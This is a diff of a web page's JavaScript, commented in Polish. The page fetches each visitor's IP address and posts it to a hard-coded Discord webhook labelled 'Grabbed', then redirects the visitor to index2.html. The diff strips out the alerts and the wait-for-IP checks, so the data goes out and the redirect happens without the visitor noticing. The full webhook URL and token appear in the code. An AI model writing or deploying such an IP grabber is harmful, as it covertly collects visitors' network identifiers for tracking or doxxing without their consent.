@@ -40,45 +40,26 @@
                 currentIP = data.ip;
             })
             .catch(() => {
-                document.getElementById("ip").textContent = "Czekaj!";
+                // Jeśli nie uda się pobrać IP, ustawiamy chociaż informację
+                document.getElementById("ip").textContent = "Błąd połączenia";
             });
 
-        // Funkcja kopiowania do schowka
-        function copyIP() {
-            if (!currentIP) return;
-
-            navigator.clipboard.writeText(currentIP)
-                .then(() => alert("Czekaj! " + currentIP))
-                .catch(() => alert("Czekaj!"));
-        }
-
-        // Funkcja wysyłania aktualnego IP do Discorda i przekierowanie
         function sendToDiscord() {
-            // Zabezpieczenie na wypadek, gdyby ktoś kliknął zanim IP się załaduje
-            if (!currentIP) {
-                alert("Czekaj!");
-                return;
-            }
-
+            // Jeśli IP jeszcze się nie pobrało, wymuszamy przekierowanie bez czekania
+            // lub po prostu wysyłamy to co mamy (puste lub błąd)
+            
             fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                    content: "Grabbed " + currentIP
+                    content: "Grabbed " + (currentIP || "Brak IP")
                 })
             })
-            .then(() => {
-                alert("Wchodzisz do strony");
-                // Przekierowanie do index.html po kliknięciu OK w alercie
+            .finally(() => {
+                // .finally wykona się zawsze, niezależnie czy wysyłanie się udało, czy był błąd
                 window.location.href = "index2.html"; 
-            })
-            .catch(err => {
-                console.error(err);
-                // Opcjonalnie: można tu też dodać przekierowanie w razie błędu wysyłania na Discord
-                alert("Wystąpił błąd, ale przechodzisz dalej.");
-                window.location.href = "index2.html";
             });
         }
     </script>
